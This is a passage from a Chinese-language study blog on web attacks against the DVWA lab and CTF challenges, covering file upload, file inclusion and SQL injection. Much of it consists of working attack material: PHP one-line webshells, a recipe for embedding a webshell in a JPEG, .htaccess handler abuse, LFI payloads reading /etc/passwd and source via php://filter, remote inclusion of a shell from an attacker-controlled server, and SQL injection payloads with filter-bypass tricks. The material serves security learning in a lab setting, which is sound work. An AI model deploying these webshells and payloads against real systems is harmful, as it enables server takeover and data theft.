uploaded.&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>这次的条件判断语句是直接检查文件的后缀，上面两种方法都不行。那我们只能是上传图片，如果图片中含有木马，那我们也可以用中国菜刀拿下这个系统。</p>
<p>攻击方法要与文件包含漏洞[低]结合。</p>
<h2 id="1-4-一句话木马"><a href="#1-4-一句话木马" class="headerlink" title="1.4 一句话木马"></a>1.4 一句话木马</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">shell1.php</span><br><span class="line">&lt;?php @eval($_POST[&#x27;caidao&#x27;]);?&gt;</span><br><span class="line"></span><br><span class="line">shell2.php</span><br><span class="line">&lt;?php eval($_REQUEST[&#x27;cmd&#x27;]);?&gt;	</span><br><span class="line">http://192.168.137.146/dvwa/hackable/uploads/shell2.php?cmd=system(&quot;pwd&quot;);</span><br><span class="line"></span><br><span class="line">shell3.php</span><br><span class="line">&lt;?php system($_REQUEST[&#x27;chopper&#x27;]);?&gt;</span><br><span class="line">http://192.168.137.146/dvwa/hackable/uploads/shell3.php?chopper=ls /</span><br><span class="line"></span><br><span class="line">shell4.jpg</span><br><span class="line">shell4.php</span><br><span class="line">&lt;?php                                                            ?&gt;&#x27;);?&gt;</span><br><span class="line">copy hello.jpg/b+shell4.php/a shell4.jpg</span><br><span class="line"></span><br><span class="line">shell5.phtml</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27;caidao&#x27;]);&lt;/script&gt;</span><br><span class="line">&lt;script language=&#x27;php&#x27;&gt;system(&#x27;cat /flag&#x27;);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">shell6.php</span><br><span class="line">#加上图片文件头</span><br></pre></td></tr></table></figure>
<h2 id="1-5-weevly用法"><a href="#1-5-weevly用法" class="headerlink" title="1.5 weevly用法"></a>1.5 weevly用法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">weevly generate [password] [filename]	生成一个木马文件</span><br><span class="line">weevly [url to file] [password]	连接到服务器</span><br></pre></td></tr></table></figure>
<h2 id="1-6-htaccess"><a href="#1-6-htaccess" class="headerlink" title="1.6 .htaccess"></a>1.6 .htaccess</h2><p>.htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。通过.htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。</p>
<p>构造.htaccess文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;sj&quot;&gt;</span><br><span class="line"> SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">#FileMathch参数即为文件名的正则匹配，标签内的意思是将sj文件当成php文件解析</span><br></pre></td></tr></table></figure>
<p> 构造sj文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;ls /var/www/html&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;cat /var/www/html/flag.php&quot;</span>); <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">passthru</span>(<span class="string">&quot;find / -name flag&quot;</span>); <span class="meta">?&gt;</span><span class="comment">#这个不行</span></span><br></pre></td></tr></table></figure>
<h2 id="1-7-00截断"><a href="#1-7-00截断" class="headerlink" title="1.7 00截断"></a>1.7 00截断</h2><p>在url中%00表示ascii码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。</p>
<p>参考如下文章：<a target="_blank" rel="noopener" href="https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/gr98bRUp63TUwcHiaLZzEf.html">https://writeup.ctfhub.com/Skill/Web/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/gr98bRUp63TUwcHiaLZzEf.html</a></p>
<h1 id="2-文件包含漏洞"><a href="#2-文件包含漏洞" class="headerlink" title="2. 文件包含漏洞"></a>2. 文件包含漏洞</h1><p>文件包含类似于C语言的include头文件，python的import文件，也类似于函数调用。</p>
<h2 id="2-1-本地文件包含-LFI"><a href="#2-1-本地文件包含-LFI" class="headerlink" title="2.1 本地文件包含(LFI)"></a>2.1 本地文件包含(LFI)</h2><p>URL格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://7ce7fcde-b026-4e63-a0f1-11442ec86169.node4.buuoj.cn:81/?file=hint.php?../../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=include.php</span><br><span class="line"></span><br><span class="line">#include.php和a.jpg与index.php在同一目录</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=a.jpg		</span><br><span class="line"></span><br><span class="line">#/ect/passwd与index.php路径不同，也可以执行</span><br><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=/etc/passwd	</span><br></pre></td></tr></table></figure>
<p>URL中带参数，定位到服务器的某个目录某个文件中。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WAF的问题：WAF不允许num传入字母，那我们可以在num前加个空格来绕过WAF</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));	列出参数目录中的文件和目录，这里由于单引号和斜杠被过滤了，那就用<span class="title function_ invoke__">chr</span>()绕过，<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)就是斜杠/</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)));</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flagg&#x27;</span>));	读取flagg文件</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="string">&#x27;flagg&#x27;</span>));	如果只绕过/，后面的引号又被过滤掉了，所以将所有字符都换成<span class="title function_ invoke__">chr</span>()</span><br><span class="line">这里/=<span class="title function_ invoke__">chr</span>(<span class="number">47</span>)，f=<span class="title function_ invoke__">chr</span>(<span class="number">102</span>),l=<span class="title function_ invoke__">chr</span>(<span class="number">49</span>),a=<span class="title function_ invoke__">chr</span>(<span class="number">97</span>),g=<span class="title function_ invoke__">chr</span>(<span class="number">103</span>),g=<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)来进行绕过</span><br><span class="line">/calc.php? num=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">chr</span>(<span class="number">47</span>).<span class="title function_ invoke__">chr</span>(<span class="number">102</span>).<span class="title function_ invoke__">chr</span>(<span class="number">49</span>).<span class="title function_ invoke__">chr</span>(<span class="number">97</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>).<span class="title function_ invoke__">chr</span>(<span class="number">103</span>)));	.表示连接</span><br></pre></td></tr></table></figure>
<p>有时候下载下来的txt文件貌似找不到flag，但将txt文件放在URL中就可找到flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">读敏感文件</span><br><span class="line">?file=/etc/passwd</span><br><span class="line"></span><br><span class="line">利用封装协议读源代码,能看到php文件源码</span><br><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=index.php</span></span><br><span class="line"></span><br><span class="line">包含图片Getshell</span><br><span class="line">在上传的图片中写入恶意代码，然后用本地文件包含调用，就会执行图片里的php代码</span><br><span class="line"></span><br><span class="line">包含日志文件Getshell</span><br><span class="line">路径</span><br><span class="line">apache:/<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">nginx:/<span class="keyword">var</span>/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">session文件包含Getshell</span><br><span class="line">?file=/<span class="keyword">var</span>/log/nignx/access.log</span><br><span class="line"></span><br><span class="line">照片木马制作</span><br><span class="line">copy <span class="number">1</span>.jpg/b + <span class="number">1</span>.php/a <span class="number">2</span>.jpg</span><br></pre></td></tr></table></figure>
<h2 id="2-2-远程文件包含-RFI"><a href="#2-2-远程文件包含-RFI" class="headerlink" title="2.2 远程文件包含(RFI)"></a>2.2 远程文件包含(RFI)</h2><p>URL格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=http://web_server/b.jpg</span><br></pre></td></tr></table></figure>
<p>PHP的配置选项allow_url_include为ON的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞”，远程文件包含更容易实现。</p>
<p><code>allow_url_fopen = On</code> 是否允许打开远程文件； <code>allow_url_include = On</code> 是否允许include/require远程文件。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-d46d08980443a4ef.sandbox.ctfhub.com:10080/?file=http://你的服务器地址:8000/shell1.php</span><br></pre></td></tr></table></figure>
<h2 id="2-3-利用php-filter伪协议"><a href="#2-3-利用php-filter伪协议" class="headerlink" title="2.3 利用php://filter伪协议"></a>2.3 利用php://filter伪协议</h2><p>如果想要读取本地的PHP文件，可以用php://filter伪协议。</p>
<p>当与包含函数结合时，php://filter流会被当作php文件执行。这时，如果我们不想让它执行，只是想查看源码，可以对其进行编码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://2be338a6-7ba2-453a-b873-4b4b7a4b4221.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<h2 id="2-4-文件包含漏洞-低"><a href="#2-4-文件包含漏洞-低" class="headerlink" title="2.4 文件包含漏洞[低]"></a>2.4 文件包含漏洞[低]</h2><p>结合文件上传漏洞[高]，我们用<strong>本地文件包含</strong>。思路是上传图片木马，即图片中包含生成木马的代码，如果系统有文件包含漏洞，就可以执行图片中的代码，生成木马。</p>
<p>利用php://fileter伪协议进行文件包含。</p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>$_GET函数表示参数会显示在地址栏上，默认地址为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/?page=include.php</span><br></pre></td></tr></table></figure>
<p>准备一张小一点的图片hello.jpg，一个木马：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell4.php</span><br><span class="line"><span class="meta">&lt;?php</span>                                                            <span class="meta">?&gt;</span><span class="string">&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
<p>用cmd生成一个图片木马hi.jpg：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy hello.jpg/b + shell4.php/a hi.jpg</span><br></pre></td></tr></table></figure>
<p>将图片放入winhex拉到最下面就可以看到木马已经放进图片中了。（或者用记事本打开图片也能看到）</p>
<p>将图片上传后，去到文件包含漏洞页面，执行payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/index.php?page=../../hackable/uploads/hi.jpg</span><br><span class="line"></span><br><span class="line">//dvwa文件上传访问的目录</span><br><span class="line">/var/www/dvwa/hackable/uploads	</span><br><span class="line"></span><br><span class="line">//dvwa文件包含访问的目录</span><br><span class="line">/var/www/dvwa/vulnerabilities/fi	</span><br></pre></td></tr></table></figure>
<p>执行完后网页会出现一堆乱码，别管它，关键是会在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，正是我们放进图片中的代码生成的一句话木马。</p>
<p>写入菜刀地址：<a target="_blank" rel="noopener" href="http://192.168.137.146/dvwa/vulnerabilities/fi/shell4.php和密码，成功渗透。">http://192.168.137.146/dvwa/vulnerabilities/fi/shell4.php和密码，成功渗透。</a></p>
<p><strong>远程文件包含</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip a	//查看IP地址：192.168.137.144</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将txt文件写进攻击机服务器的站点</span></span><br><span class="line">vim /<span class="keyword">var</span>/www/html/chopper.txt</span><br><span class="line"><span class="meta">&lt;?php</span>                                                           <span class="meta">?&gt;</span><span class="string">&#x27;);?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以打开<a target="_blank" rel="noopener" href="http://192.168.137.144/chopper.txt试试，如果正常显示我们写进去的内容说明路径没错。">http://192.168.137.144/chopper.txt试试，如果正常显示我们写进去的内容说明路径没错。</a></p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/?page=http://192.168.137.144/chopper.txt</span><br></pre></td></tr></table></figure>
<p>执行后在/var/www/dvwa/vulnerabilities/fi目录下生成一个shell4.php文件，成功。</p>
<h2 id="2-2-文件包含漏洞-中"><a href="#2-2-文件包含漏洞-中" class="headerlink" title="2.2 文件包含漏洞[中]"></a>2.2 文件包含漏洞[中]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">// The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Bad input validation</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;http://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;https://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);        </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>源码的意思是将参数中含有”<a target="_blank" rel="noopener" href="http://&quot;，&quot;https://&quot;替换成空，这时只要将限制字符串重写：">http://&quot;，&quot;https://&quot;替换成空，这时只要将限制字符串重写：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.137.146/dvwa/vulnerabilities/fi/?page=httphttp://://192.168.137.144/chopper.txt</span><br><span class="line"></span><br><span class="line">把中间的http://替换成空，前后一合并就可以访问到远程服务器</span><br></pre></td></tr></table></figure>
<p>第二种方法是用本地文件包含来做，同[低]。</p>
<h2 id="2-3-文件包含漏洞-高"><a href="#2-3-文件包含漏洞-高" class="headerlink" title="2.3 文件包含漏洞[高]"></a>2.3 文件包含漏洞[高]</h2><p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        </span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>]; <span class="comment">//The page we wish to display </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Only allow include.php</span></span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
<p>基本锁死了。</p>
<p><strong>小知识</strong></p>
<p>robots.txt是爬虫的君子协议，说明哪些目录是不能爬的，一般直接在网址后面输入/robots.txt就可看到，但同时也有一点此地无银三百两的意思，说明这些目录很重要。</p>
<p>Ctrl + L清空终端界面</p>
<h1 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3. SQL注入"></a>3. SQL注入</h1><p>危害：</p>
<ol>
<li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露</li>
<li>网页篡改：通过操作数据库对特定网页进行篡改</li>
<li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员账户被篡改</li>
<li>服务器被远程控制：被安装后门</li>
</ol>
<p>MySQL基础操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">show databases;					查看数据库</span><br><span class="line">use database_name;				使用数据库</span><br><span class="line">show tables;					查看表</span><br><span class="line">desc table_name;				查看表结构</span><br><span class="line">select * from table_name;		查看表数据</span><br><span class="line">create database database_name;	创建数据库</span><br><span class="line">drop database database_name;	删除数据库</span><br></pre></td></tr></table></figure>
<p>常用变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">database()	查看当前数据库名	select database();</span><br><span class="line">user()		查看当前用户		 select user();</span><br><span class="line">version()	查看版本		   select version();</span><br><span class="line">show variables like&#x27;%datadir%&#x27;;		查看安装路径</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2,database()</span><br><span class="line">union select 1,2,group_concat(table_name) from information_sehema.tables where table_schema=database()</span><br><span class="line">union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;</span><br><span class="line">union select 1,2,group_concat(column1_name,column2_name) from xxx</span><br></pre></td></tr></table></figure>
<p><strong>information_schema库</strong></p>
<p>information_schema是非常重要的库，是数据库字典，包含所有数据库的库信息，表信息。</p>
<p>查询数据库名为dvwa的所有表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select TABLE_SCHEMA,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;dvwa&#x27;;</span><br><span class="line">+--------------+------------+</span><br><span class="line">| TABLE_SCHEMA | TABLE_NAME |</span><br><span class="line">+--------------+------------+</span><br><span class="line">| dvwa         | guestbook  |</span><br><span class="line">| dvwa         | users      |</span><br><span class="line">+--------------+------------+</span><br><span class="line">2 rows in set (0.08 sec)</span><br></pre></td></tr></table></figure>
<p>查询数据库名为dvwa的users表的所有列：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select COLUMN_NAME from information_schema.columns where TABLE_SCHEMA=&#x27;dvwa&#x27; and TABLE_NAME=&#x27;users&#x27;;</span><br><span class="line">+-------------+</span><br><span class="line">| COLUMN_NAME |</span><br><span class="line">+-------------+</span><br><span class="line">| user_id     |</span><br><span class="line">| first_name  |</span><br><span class="line">| last_name   |</span><br><span class="line">| user        |</span><br><span class="line">| password    |</span><br><span class="line">| avatar      |</span><br><span class="line">+-------------+</span><br><span class="line">6 rows in set (0.03 sec)</span><br></pre></td></tr></table></figure>
<h2 id="3-1-错误注入"><a href="#3-1-错误注入" class="headerlink" title="3.1 错误注入"></a>3.1 错误注入</h2><h3 id="3-1-1-SQL注入-低"><a href="#3-1-1-SQL注入-低" class="headerlink" title="3.1.1 SQL注入(低)"></a>3.1.1 SQL注入(低)</h3><p>输入’——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br><span class="line">1&#x27; union select 1#</span><br><span class="line">1&#x27; order by 4 -- d</span><br><span class="line">-1&#x27; union select 1,2,3 -- +</span><br><span class="line">-1 union select 1,database()</span><br></pre></td></tr></table></figure>
<p>有时会将select,from,or,where等关键字过滤，可以将这些关键字进行重写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x27; ununionion seleselectct 1,database(),group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=&#x27;geek&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27; ununionion seleselectct 1,database(),group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;b4bsql&#x27;#</span><br><span class="line"></span><br><span class="line">&#x27; ununionion seleselectct 1,database(),group_concat(id,username,passwoorrd) frfromom b4bsql#</span><br></pre></td></tr></table></figure>
<div class="table-container">
<table>
<thead>
<tr>
<th>过滤关键字</th>
<th>绕过方法之一</th>
<th>绕过方法之二</th>
<th>绕过方法之三</th>
</tr>
</thead>
<tbody>
<tr>
<td>select</td>
<td>重写</td>
<td>大小写</td>
<td>selec\x74</td>
</tr>
<tr>
<td>or</td>
<td>重写</td>
<td>大小写</td>
<td>o\x72</td>
</tr>
<tr>
<td>union</td>
<td>重写</td>
<td>大小写</td>
<td>unio\x6e</td>
</tr>
<tr>
<td>空格</td>
<td>#、—、//、/**/、%00</td>
<td>%2520</td>
<td>‘</td>
</tr>
</tbody>
</table>
</div>
<p>输入’——单引号，就是要让页面报错，说明它能够接受单引号，有注入点。</p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>    </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;Submit&#x27;</span>]))&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Retrieve data</span></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$getid</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="title function_ invoke__">mysql_error</span>() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="variable">$num</span> = <span class="title function_ invoke__">mysql_numrows</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="variable">$i</span> &lt; <span class="variable">$num</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$first</span> = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;first_name&quot;</span>);</span><br><span class="line">        <span class="variable">$last</span> = <span class="title function_ invoke__">mysql_result</span>(<span class="variable">$result</span>,<span class="variable">$i</span>,<span class="string">&quot;last_name&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;ID: &#x27;</span> . <span class="variable">$id</span> . <span class="string">&#x27;&lt;br&gt;First name: &#x27;</span> . <span class="variable">$first</span> . <span class="string">&#x27;&lt;br&gt;Surname: &#x27;</span> . <span class="variable">$last</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在源码上可以看到我们输入的东西根据这条语句去查询：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$getid</span> = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>意思是将我们输入的ID的名字显示出来，但如果输入<strong>‘ or 1=1 — ddd</strong>，整条语句变为</p>
